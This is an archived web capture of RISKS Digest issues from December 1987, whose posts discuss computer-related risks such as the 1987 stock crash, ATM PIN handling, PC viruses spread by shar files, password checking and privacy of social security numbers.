that would deny legal protection to the poor and would prevent pursuit
of cases against the largest and wealthiest defendants.  If, as is often
asserted, manufacturers are wrongly found negligent because a jury wants
to compensate some obviously suffering individual, then the compensation
under the liability-no-negligence system should satisfy the jury's desires.

Such a system requires specifying a number of special cases; for example,
if a corporation buys an expert system, they presumably have access to
someone who can explain the risks inherent in using that system.  In
such cases, sharp limits on non-negligent liability are reasonable.  It
would not be the author's fault if the company managed the entire pension
fund with his financial system.

In general, if we were to shift to such a split system of liability, it
would take us quite a while and quite a bit of experience to develop
the details.  Finally, I would like to add that this idea is not original
with me; I first saw it advocated in an editorial in Nature.

Mark A. Fulk
fulk@cs.rochester.edu

P.S. This is not to say that government-imposed fines and the like are
not also appropriate.  They are simply insufficient, as the government
frequently lacks the stomach to take on offenders.  The tort system
provides a channel for citizen-originated complaints to get a hearing
in front of disinterested parties.

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Squirrels, mice, bugs, and Grace Hopper's moth (Re: <A HREF="/Risks/5.78.html">RISKS-5.78</A>)
</A>
</H3>
<address>
Peter Mabey 
&lt;<A HREF="mailto:mcvax!stl.stc.co.uk!phm@uunet.UU.NET">
mcvax!stl.stc.co.uk!phm@uunet.UU.NET
</A>&gt;
</address>
<i>
Mon, 21 Dec 87 16:13:24 GMT
</i><PRE>
Organization: STL,Harlow,UK.

&gt;  Squirrels, mice, bugs, and Grace Hopper's moth (Mark Mandel) ...
&gt;
&gt;The word "bug", in the sense we use in the computer world, did NOT
&gt;originate with "Amazing" Grace Hopper's moth. ...

According to the Oxford English Dictionary (Supplement I), the first
recorded use of the term in print is a quote from Edison in the Pall Mall
Gazette of 1889 - so it's probably coming up to its centenary now.

Peter Mabey  (phm@stl  ...!mcvax!ukc!stl!phm +44-279-29531 x3596)
Standard Technology Ltd., London Road, Harlow, Essex CM17 9NA, U.K.

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Fire at O'Hare (Computerworld, Dec 14 issue)
</A>
</H3>
<address>
99700000
&lt;<A HREF="mailto:haynes@ucscc.UCSC.EDU ">
haynes@ucscc.UCSC.EDU 
</A>&gt;
</address>
<i>
Tue, 22 Dec 87 11:45:25 PST
</i><PRE>

Has an article about another fire resulting in melted cables, this time a
fire at O'Hare that put United Airlines out of operation.

And has a special section on computer security.  No better than one would
expect from Computerworld, but that's it.

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
American Express computer problem
</A>
</H3>
<address>
Frank Wales 
&lt;<A HREF="mailto:mcvax!zen.co.uk!frank@uunet.UU.NET">
mcvax!zen.co.uk!frank@uunet.UU.NET
</A>&gt;
</address>
<i>
Fri, 18 Dec 87 17:23:52 GMT
</i><PRE>
Organization: Zengrange Limited, Leeds, England

You may be interested in a letter I received this morning from American
Express; its text is as follows:

  [the letter is verbatim -- the poor grammar is theirs, not mine]

  Dear Mr Wales

  I regret to advise you that a problem has arisen concerning
  access to our Automated Teller Machine network.

  As you know a Personal Identification Number (PIN) is needed to
  use these machines.  Due to an internal system error your
  unique PIN has been deleted.  The effect of which, is to deny 
  you access to cash or Travellers Cheque withdrawal.  Would you
  please call London (01) [...] or Brighton [...]
  where our staff will immediately amend our records with the PIN
  of your choice.  When telephoning, please be prepared to answer
  two or three questions about your personal details so that we
  can maintain the necessary security.

  I am very sorry for the inconvenience this must cause.

  Yours sincerely
  (signed by Xerox)
  N.Colwell
  Director
  Customer Services

      [I have deleted the telephone numbers above, for obvious reasons.  PGN]

First of all, because the numbers are not normal customer service numbers, I
called the 24-hour Emergency number (the normal Customer Service number was
busy, as usual), and made sure that the letter was not a scam.  I was told,
after some rummaging around by the operator, that both were legitimate Amex
numbers.  I then called the London one, and found that, according to the
exchange, it didn't exist.  I then called the Brighton one and, after being
asked to hold for so long that the operator had to physically go and get her
supervisor, sorted out my PIN with them.

In the course of this, I asked what had happened: (I'm paraphrasing here --
it was an hour ago)

Amex: "A slight computer problem; nothing to worry about."

Me: "You mean you've had a security breach?"

Amex: "No, no.  Nothing like that.  That's impossible.  Our systems are
completely confidential.  Someone was just transferring some information onto
one of our systems, to make it more efficient, you know, and some information
got deleted in the process.  We didn't even know until members started
calling us up to ask why their cards were being rejected by dispensers."

I didn't ask where their backups were -- they obviously didn't have any,
or they wouldn't have been reduced to admitting their failure to their
customers.

Aside from Amex's dubious practice of actually asking customers to write
down a PIN and post it to them (or, in this case, tell them over the phone),
something which both astonishes and amuses my Bank Manager, what does
this episode reveal about American Express's computer systems and procedures,
often touted as being among the best in the banking business?

[As a side note, I'm also not too convinced that the questions about
personal details are good enough to convince them that I am who I say I am;
I know that the information I gave wouldn't convince *me*.  But that's an
issue for another day.]

Frank Wales, Development Engineer,    [frank@zen.uucp&lt;-&gt;mcvax!zen.co.uk!frank]
Zengrange Ltd., Greenfield Rd., Leeds, ENGLAND, LS9 8DB. (+44) 532 489048 x220 

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
NYT article on computers in stock crash
</A>
</H3>
<address>
Hal Perkins
&lt;<A HREF="mailto:hal@gvax.cs.cornell.edu ">
hal@gvax.cs.cornell.edu 
</A>&gt;
</address>
<i>
Mon, 21 Dec 87 21:48:36 EST
</i><PRE>

[Last week the New York Times ran a series of articles analyzing the
stock market crash.  One was on the role of computers in the crash.
It's too long to include the whole thing in Risks.  These excerpts
concentrate on the unplanned and unexpected and omit background
information about program trading, etc.  I highly recommend the entire
article to anyone who is interested in the subject.  It also is good
holiday reading for any Star Wars fans who believe that computers can
be programmed to direct a real-time battle successfully.  HP]


From The New York Times, Tuesday, December 15, 1987.  Page 1.

The Computer's Contribution to the Rise and Fall of Stocks
by David E. Sanger

In the span of a few hours, the stock market's October collapse drove
home the fact that new technology has done far more to Wall Street than
just accelerate the tempo of trading.

Securities firms have always embraced innovations that promised to
improve their profits.  During this decade... brokerages spent millions
of dollars on electronic networks... [and on] complex computerized
trading techniques to exploit the flood of information.

But in the process, the new generation of hardware and software
fundamentally altered the way buying and selling decisions were made.
And they subtly magnified the degree of risk that investors and traders
routinely accepted.

... [B]ig investors, seeking an advantage measured in seconds, were
often led to abandon independent judgement in favor of executing
trading strategies programmed into their computers.

On Monday, Oct. 19, Wall Street's legendary herd instincts, now
embedded in digital code and amplified by hundreds of computers, helped
turn a selloff into a panic....

"We are learning that when we compress the time in which things happen,
they happen differently," said Robert A. Brusca, the chief economist at
Nikko Securities....

[Discussion of how the technology fueled the willingness of big
investors to trade for short-term profit instead of investing for
long-term returns.]  In other words, it helped turn [large,
traditionally conservative institutions] from investors into traders.

What's more, the computer's enormous appetite for price data helped
divorce buy and sell decisions from developments in the business world,
focusing them instead on numerical relationships among thousands of
fluctuating stock prices....

Technology also gave a false sense of security to investors who
deceived themselves into thinking that ballyhooed computer-based
trading techniques would somehow protect them in a falling market....

The Allure of Technology

[Discussion of how the stock exchanges have built huge computer centers
to process enormous daily transaction volumes.]

Starting six years ago, a new generation of personal computers and more
powerful work stations began playing another, very different role...
They were programmed to spot bargains, and to constantly compare the
prices of stock index futures contracts... with the prices of the
actual stocks....

Without question the new techniques made the markets more efficient...
[assuring] that prices reflected pertinent information instantly, and
they encouraged investors to trade simultaneously in more than one
market, helping to minimize disparities in prices.

But the programs also introduced enormous pressure to act and react
instantly.  "Overnight, the reaction time to market-influencing events
dropped from months or days to minutes and seconds," said Allen Sinai,
the chief economist of Sherson Lehman Brothers.  "Unless you could
evaluate all this data instantly, you were out of business."

New Tricks for Investors

[Description of various "program trading" strategies, including stock
index arbitrage, which takes advantage of momentary differences between
the prices of stocks and of the corresponding futures contracts (trades
must be made instantly before the price difference disappears), and
portfolio insurance, which is supposed to reduce the risk of a downturn
by selling stock index futures.]

[on portfolio insurance:]  Advocates of the system were asserting
before the collapse that it assured that losses would not exceed 5
percent of the value of the portfolio....

Promotions [of portfolio insurance] worked: By October, between $70
billion and $90 billion was invested in funds using some form of the
insurance....

As a result, some [investors] abandoned ordinary prudent techniques,
such as selling a portion of their holdings for cash when the market
hit new highs, because they were confident the programs would work....

When Facts Became Myths

The problems lay in the computerized models of how markets act:  They
rested on assumptions that proved false.  One assumption, for example,
was that the markets would be well behaved, meaning that stock prices
and futures prices would closely track each other.  Another was that
whenever the computer commanded a buy or a sell, there would be buyers
and sellers.

On Oct. 19, neither condition applied.  Stocks and futures prices were
far out of whack.  At times, no buyers could be found.  Computers
literally froze -- they were not programmed to cope with the
unexpected.

The role of stock index arbitrage is harder to assess....

...traders say that it may have begun a wave of selling that was then
exaggerated by portfolio insurance programs.

In retrospect, the portfolio insurance programs may have helped create
much of the turmoil that ultimately defeated them.

"The problem was that everyone is working from roughly the same
theories," said Peter U. Vinella, a partner at Berkeley Investment
Technologies in Berkeley, Calif., which writes many complex trading
programs.  "They all get the same feedbacks.  And that leads everyone
to take the same action."

A Fear of Defying the Computer

Why do people become captive to computers?  Programs, of course can
easily be overruled by humans, who make the final decision about
whether to proceed with a transaction.  But amid chaos, when seconds
could mean the difference between profit and ruin, traders are deeply
reluctant to disregard the neat columns of computer-generated
instructions.

"People get lulled into thinking, `My program says this will work,'"
said Robert H. Mundheim, the dean of the University of Pennsylvania law
school....  "And you don't have time to think through the assumptions
that went into the programs -- if you understood them in the first
place."

[Discussion of whether a fully automated trading system might have
avoided some of the panic that set in when orders were backed up for
hours, causing investors to sell even more.]

Slowing of Market Studied

Investigators have already discarded as unenforceable one option:
stopping the use of computer programs that speed the pace of
decision-making.  More practical, experts say, would be actions that
slow the market, giving participants a chance to absorb new data and
adjust accordingly....

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.80.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.82.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-34</DOCNO>
<DOCOLDNO>IA012-000130-B023-64</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.82.html 128.240.150.127 19970217014750 text/html 20069
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:46:20 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 82</TITLE>
<LINK REL="Prev" HREF="/Risks/5.81.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.83.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.81.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.83.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 82</H1>
<H2> Wednesday 23 December 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
NYT article on computers in stock crash 
</A>
<DD>
<A HREF="#subj1.1">
P. T. Withington
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  ...BAD PRACTICE to truncate anything without notice 
</A>
<DD>
<A HREF="#subj2.1">
Doug Rudoff
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  The spread of viruses and news articles 
</A>
<DD>
<A HREF="#subj3.1">
Allan Pratt
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Common passwords list 
</A>
<DD>
<A HREF="#subj4.1">
Doug Mansur
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: IBM Christmas Virus 
</A>
<DD>
<A HREF="#subj5.1">
Skip Montanaro
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Cleaning PC's can be bad for your health...  
</A>
<DD>
<A HREF="#subj6.1">
John McMahon
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  PIN verification security 
</A>
<DD>
<A HREF="#subj7.1">
Otto Makela
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Social Insecurity 
</A>
<DD>
<A HREF="#subj8.1">
Roger Pick
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
NYT article on computers in stock crash
</A>
</H3>
<address>
P. T. Withington 
&lt;<A HREF="mailto:PTW@DIAMOND.S4CC.Symbolics.COM">
PTW@DIAMOND.S4CC.Symbolics.COM
</A>&gt;
</address>
<i>
Wed, 23 Dec 87 11:51 EST
</i><PRE>
To: RISKS FORUM &lt;RISKS@KL.SRI.COM&gt;

An article in the Boston Globe yesterday (23 December) covers similar
issues, but raises a few additional points which make me think that (as
usual) the computer is only an unwitting accomplice and not the source
of the trouble at all.

    Date: Mon, 21 Dec 87 21:48:36 EST
    From: hal@gvax.cs.cornell.edu (Hal Perkins)
[...]
    Promotions [of portfolio insurance] worked: By October, between $70
    billion and $90 billion was invested in funds using some form of the
    insurance....

The Globe article points out that when portfolio insurance was first
"invented" it was dismissed in an article in Fortune (ca. 1980) as a
"carnival act".  Its inventors pursued its promotion however, and the
"invention" of index futures allowed them to make the concept more
palatable to fund managers (since they were no longer required to change
the makeup of their portfolio to participate).  Shortly to follow was
the "invention" of index arbitrage, which provided a ready appetite for
the portfolio insurers' future trading.

My inference is that what legitmized the "carnival act" was not any
understanding of its mechanism, but simply a track record.
Unfortunately there are a large number of investors who believe that
history is an accurate predictor.

[...]

    "The problem was that everyone is working from roughly the same
    theories," said Peter U. Vinella, a partner at Berkeley Investment
    Technologies in Berkeley, Calif., which writes many complex trading
    programs.  "They all get the same feedbacks.  And that leads everyone
    to take the same action."

Here is the nub.  My inference is that as long as insurance and
arbitrage were *unusual* investment policies, they actually "worked" by
trading on discrepancies arising from imperfect information.  Of course
their success led to popularity, and eventually to the situation Vinella
describes:  all sellers and no buyers, the downfall of any Ponzi scheme.

    A Fear of Defying the Computer

[...]

    "People get lulled into thinking, `My program says this will work,'"
    said Robert H. Mundheim, the dean of the University of Pennsylvania law
    school....  "And you don't have time to think through the assumptions
    that went into the programs -- if you understood them in the first
    place."

The Globe points out that the inventors and primary promoters of
portfolio insurance (LOR Corp.) actually did "sanity check" what their
computers told them to do and held off making the massive futures sales
the program directed.  (I believe they realized, if only intuitively,
that their algorithm was operating out of its useful range, because they
had not forseen the discrepancies it was now receiving as inputs.)
However, several of their licensees did exactly as the program directed,
having been lulled into beliving in its infallibility, only to find
there were no buyers.  As the sell orders mounted, depressing the price,
the algorithms, lacking any sanity checks, simply directed more sales.

It's interesting to speculate whether the limited automation of the
exchanges exacerbated the situation or acted as a governor to slow
things down enough for conventional investors to react to the
bargain-basement prices and finally put a floor under the madness.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
...BAD PRACTICE to truncate anything without notice (Re: <A HREF="/Risks/5.79.html">RISKS-5.79</A>)
</A>
</H3>
<address>
Doug Rudoff
&lt;<A HREF="mailto:wiley!doug@uunet.UU.NET ">
wiley!doug@uunet.UU.NET 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 23 Dec 87 19:12:49 GMT
Organization: TRW Inc., Redondo Beach, CA

About two years ago I was working on a project that required coding in PL/I. I
had a problem with running out of memory while exectuting my code. After many
hours of frustration I discovered the problem was that I had two procedures
'put_message' and 'put_page' (which called 'put_message') truncated to the 
same name. This was due to PL/I's truncation scheme of taking the FIRST four
letters and the LAST three of a procedure. Thus, both procedures were
identified as 'put_age' and I ended up running out of memory because of
unintentional recursive procedure calls.

Doug RUDOFF        TRW Inc, Redondo Beach, CA  {cit-vax,trwrb,uunet}!wiley!doug
H: (213) 318-9218  W: (213) 812-2768               wiley!doug@csvax.caltech.edu

    [Recursively Call a spade a spade a spade ... but don't expect it to
    return.  (If it weren't Christmas time, and it hadn't been pouring in
    LA, I probably would have refrained from annotating this message from
    RUDOFF THE RED{ONDO} KNOWS RAINGEAR.)  Happy holidays to all.  PGN]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
The spread of viruses and news articles (Re: <A HREF="/Risks/5.80.html">RISKS-5.80</A>)
</A>
</H3>
<address>
Allan Pratt
&lt;<A HREF="mailto:ucbcad!ames.UUCP!atari!apratt@ucbvax.Berkeley.EDU ">
ucbcad!ames.UUCP!atari!apratt@ucbvax.Berkeley.EDU 
</A>&gt;
</address>
<i>
Wed, 23 Dec 87 12:01:59 pst
</i><PRE>

&gt;&gt;The prank seems to be benign, and therefore beneficial.

My contribution was relevant to the above passage: the fact that it was
on the front page of a major metropolitan newspaper (The San Fransisco
Examiner, Sunday 12/20/87) with a more or less in-depth article spread
the implicit warning farther (sociologically) than the virus itself
spread.  (Granted, this metropolitan newspaper serves one of the most
computer-literate parts of the country...)

Opinions expressed above do not necessarily	-- Allan Pratt, Atari Corp.
reflect those of Atari Corp. or anyone else.	  ...ames!atari!apratt

    [I think the major point about Trojan horses, viruses, and similar
    problems is that they are relatively easy to perpetrate, but potentially
    devastating on many systems.  The cases we have seen to date are all
    rather benign (except for denials of service) or localized in effect (PC
    graphics ARF-ARF!).  The lesson is that these vulnerabilities exist.
    However, the rather benign cases suggest that deeper concern is 
    warranted.  PGN]

-----------------------------

Date:  Wed, 23 Dec 87 11:59 EST
From: Mansur@DOCKMASTER.ARPA
Subject:  Common passwords list
To: risks@csl.sri.com

I am interested in making a list of the most common passwords chosen by
users.  I'd like to see if anyone knows of any studies that have been done (I
vaguely recall hearing of at least one such study).  We are writing a program 
to check for poor passwords on our systems.  Please send replies to:
Doug Mansur                   -or-    (Mansur@dockmaster.arpa)
L-308, Lawrence Livermore National Lab., P.O. Box 808, Livermore, CA 94550P

    [At one time "Susan" was reputed to be the most popular American choice.
    I recall a British clipping citing dogs' names as popular passwords.
    However, since many prudent system managers now insist on randomly 
    generated pronounceable passwords, your study might be dated.
    Furthermore, I hope no one is stupid enough to tell you what their
    password is.  But past studies (e.g., Morris and Thompson, UNIX Password
    Security: A Case History, CACM 22 11 November 1979) have encrypted
    initials, dictionaries, etc., with great effect.  If your system permits
    access to unencrypted passwords, your study might focus on that instead.
    PGN]

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Re: IBM Christmas Virus (RISKS 5.80)
</A>
</H3>
<address>
Skip Montanaro 
&lt;<A HREF="mailto:steinmetz!montnaro@uunet.UU.NET">
steinmetz!montnaro@uunet.UU.NET
</A>&gt;
</address>
<i>
Tue, 22 Dec 87 13:33:10 EST
</i><PRE>

Ross Patterson wrote (in RISKS 5.80):

&gt;(5) Is the Internet similarly vulnerable ?

&gt;&gt;Not to this one.  It plays on several things that the Internet doesn't have:
&gt;&gt;1) A large number of IBM VM/CMS systems.  ...
&gt;&gt;2) A suitable file transfer system.  FTP doesn't apply. ... 
&gt;&gt;3) A good method of determining targets.  The CMS NAMES and NETLOG files ...

The quasi-equivalent of this problem in UNIX systems (and most of the
Internet, because of the large number of UNIX systems it contains) is the
ubiquitous shar file, an ASCII packaging machanism used to transfer code and
other ASCII files via mail and/or Usenet news transfer.  The problem lies in
the way users unpack shar files: they execute them.  Needless to say,
inspection of shar files before execution/extraction is highly recommended.

There's nothing to prevent me from writing a shar file that purports to be a
Christmas card. Execution of it might display the card, check out the contents
of various mail-related files, (like ~/.mailrc and ~/mbox) looking for likely
candidates to send the shar file, then recursively send it.

In fact, the same scheme would work for most operating systems with a
command language that could be executed from a file. UNIX systems are
especially vulnerable, however, because of their large numbers.

Skip (montanaro@ge-crd.arpa, uunet!steinmetz!sprite!montanaro)

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Cleaning PC's can be bad for your health...
</A>
</H3>
<address>
John McMahon
&lt;<A HREF="mailto:    fasteddy%sdcdcl.span@VLSI.JPL.NASA.GOV ">
    fasteddy%sdcdcl.span@VLSI.JPL.NASA.GOV 
</A>&gt;
</address>
<i>
Wed, 23 Dec 87 07:40:53 PST
</i><PRE>
To:       RISKS@KL.SRI.COM

The following "SAFE-ALERT" form was distributed at Goddard Space Flight Center
(NASA - Greenbelt, MD) about cleaning PC's.  The date was 7/29/87, alert number
X7-S-87-01.

"Recently an employee of this installation was cleaning his personal computer
screen with a glass cleaner when the screen caught on fire.

The computer had been in use for some time and had built up a static charge.
When the employee went to wipe off the glass cleaner with a tissue, his finger
hit the screen.  This action discharged the static charge causing a spark which
ignited the alcohol in the window cleaner.  A total of 8 personal computers
were checked, with only 1 other catching on fire."

The installation mentioned above was the Naval Weapons Center in China Lake, CA.

The action taken was to inform the employees about what could happen, and ask
them to use a non-flammable cleaner.  If there was a need for a flammable 
cleaner, then employees were advised to discharge the computer before
spraying.


John McMahon DFTNIC::FASTEDDY (Span) FASTEDDY@IAFBIT (Bitnet)

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
 PIN verification security
</A>
</H3>
<address>

&lt;<A HREF="mailto:MAKELA_O%FINJYU.BITNET@CUNYVM.CUNY.EDU">
MAKELA_O%FINJYU.BITNET@CUNYVM.CUNY.EDU
</A>&gt;
</address>
<i>
Wed, 23 Dec 87 15:53 O
</i><PRE>
To: risks@csl.sri.com

A while back, I posted an article on ATM card security, promising to tell
more as soon as I get the official security guide.  Well, now I have the
guide, and here are some findings, given somewhat verbatim since this
document was distributed as "confidential":
  In Finland, there are two methods of off-line verification of PIN's.
Both are DES-based, so they can be considered pretty secure (unless there
are hidden trapdoors in DES - has the analysis behind its design been made
public yet ?)
  The PIN verification is done by the "verification unit", which consists
of a keypad for PIN entry, the magnetic stripe reader unit and the main
electronics unit, which communicates with the local cash register unit.
The document also specifies which "security modules" may be used in these
verification units: Intel 8751H, Intel 8752H and AMD 9761H.  Can someone
who knows better tell what these units actually are ?  DES-chips ?
  The first method of PIN verification is the same that is used in VISA-
cards internationally: the card number, the PVV-version number (off the
card's magnetic stripe) and the PIN number the customer has entered from
the keypad are all munged through DES, using certain highly secret keys
which are distributed by the banks.  The resulting number is then compared
with the PVV-number from the card's magnetic stripe, and if it is same,
the given PIN was correct.
  The second method used is local to Finland, I guess.  In this, the card
number is encrypted with several highly controlled keys, resulting in the
actual PIN that the client should have given.  There are very strict rules
on key control, for example the master key is divided into three parts and
given to three people who each load their part to the verification unit
ala bank safe keys.
  This document also specifies the encryptation that MUST be used for all
message transmissions to/from the verification unit.  This would seem to
remove problems with faked messages etc.
  The only problem that would seem to arise is key security - if the keys
become widely known, there goes the security.

Generally, it would seem that this type of security is an overkill in
practise.  A local supermart is a good example: they are on-line to the bank
so they can send payment transactions immediately to the bank computer, they
use magnetic stripe readers to read credit card / bank card stripes, but
they still use signatures for verification.  The only reason I can think
for this is that it's simpler for them.  Hooray for minimizing of risks!

A note on ATM's swallowing cards up: my girlfriend lost her card to another
bank's ATM a couple of days ago, since she couldn't remember the new card's
PIN right.  She didn't want them to send the card by mail, since it would
take a few days, so she called the bank the next morning and told them to
keep the card, she'll come and pick it up.  Then she just went there during
her lunch break, showed ID, and they gave her card back to her, since the
card was not "wanted" or anything.  Banks over here seem much more
cooperative then the american ones I've been to.

A safe Christmas, Otto J. Makela, U of Jyvaskyla
Mail: Kauppakatu 1 B 18, SF-40100 Jyvaskyla, Finland   Phone: +358 41 613 847
BBS: +358 41 211 562 (V.22bis/V.22/Bell 212A/V.21)
BitNet: MAKELA_OTTO_@FINJYU.bitnet

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Social Insecurity
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: 23 Dec 87 11:45:22 EST (Wed)
From: rpick@ucqais.uc.edu (Roger Pick)

I have been reading RISKS for a number of months and have noticed that
the contributors seem to take it for granted that social security numbers
cannot be required except in situations involving income.

I would like to know what the basis for this common knowledge is.
Is it a statute?  A court case?  Can you give me a name or a citation
so I can look it up in our local law library?

The reason I am looking for it is that my health insurance plan is demanding
my children's social security numbers.  I seek to keep their social security
numbers private whenever possible in order to reduce the problems they will
encounter if a Big Brother society should come about.  (I give mine out 
without a second thought -- it is already in so many places that I would
have no privacy anyway.)  To be able to cite legal chapter and verse would
significantly strengthen my case; the insurers are presently intransigent.

Roger Alan Pick - QA &amp; Information Systems Department, University of Cincinnati
VOICE:  (513) 475-7166
UUCP: {decuac,psuvax1!gatech!mit-eddie,philabs!phri,pyramid}!uccba!ucqais!rpick
POST:    QAIS - Lindner Hall, Univ. Cincinnati, Cincinnati, Ohio 45221-0130 USA

   [This question is like the Yes Virginia, there is a Santa Claus letter in
   the International Herald Tribune.  Discussion goes back to early RISKS.  PGN
]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.81.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.83.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-35</DOCNO>
<DOCOLDNO>IA012-000130-B023-83</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.83.html 128.240.150.127 19970217014810 text/html 20434
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:46:31 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 83</TITLE>
<LINK REL="Prev" HREF="/Risks/5.82.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.84.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.82.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.84.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
